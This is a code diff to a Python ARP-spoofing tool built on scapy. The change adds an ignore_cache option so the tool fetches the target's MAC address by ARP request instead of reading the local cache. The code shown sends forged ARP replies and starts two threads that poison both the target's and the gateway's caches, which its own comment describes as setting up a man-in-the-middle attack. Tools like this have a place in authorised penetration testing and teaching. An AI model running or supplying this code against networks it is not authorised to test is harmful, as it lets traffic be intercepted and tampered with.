@@ -7,11 +7,11 @@ from scapy.sendrecv import send
 from termcolor import colored
 
 
-def arp_poison(target_ip, gateway_ip, interval):
+def arp_poison(target_ip, gateway_ip, interval, ignore_cache):
     if target_ip == ARP().psrc:
         target_mac = ARP().hwsrc  # Return MAC address of machine
     else:
-        target_mac = get_target_mac(target_ip)  # Get MAC address of target
+        target_mac = get_target_mac(target_ip, ignore_cache)  # Get MAC address of target
 
     # Construct ARP packet
     arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation
@@ -33,15 +33,16 @@ def get_gateway_ip():
         return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()
 
 
-def get_target_mac(target_ip):
-    # Check ARP cache for target MAC address
-    cache = os.popen("arp -a {}".format(target_ip)).read().split()
-    if sys.platform == "win32":
-        if len(cache) > 4:
-            return cache[-2].replace("-", ":")
-    else:
-        if len(cache) > 7:
-            return cache[3]
+def get_target_mac(target_ip, ignore_cache=False):
+    if not ignore_cache:
+        # Check ARP cache for target MAC address
+        cache = os.popen("arp -a {}".format(target_ip)).read().split()
+        if sys.platform == "win32":
+            if len(cache) > 4:
+                return cache[-2].replace("-", ":")
+        else:
+            if len(cache) > 7:
+                return cache[3]
 
     # Create ARP request packet
     ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -57,7 +58,7 @@ def get_target_mac(target_ip):
             time.sleep(5)
 
 
-def start(target, interval, gateway=None):
+def start(target, interval, gateway=None, ignore_cache=False):
     if target is None:  # Validate target input
         print("Error! Unspecified target.")
         sys.exit(1)
@@ -65,8 +66,8 @@ def start(target, interval, gateway=None):
         gateway = get_gateway_ip()
 
     # Poison the target's and gateway's ARP cache to establish a MITM attack
-    t1 = threading.Thread(target=lambda: arp_poison(target, gateway, interval))
-    t2 = threading.Thread(target=lambda: arp_poison(gateway, target, interval))
+    t1 = threading.Thread(target=lambda: arp_poison(target, gateway, interval, ignore_cache))
+    t2 = threading.Thread(target=lambda: arp_poison(gateway, target, interval, ignore_cache))
 
     # Set as daemon threads to allow main thread to exit
     t1.daemon = True
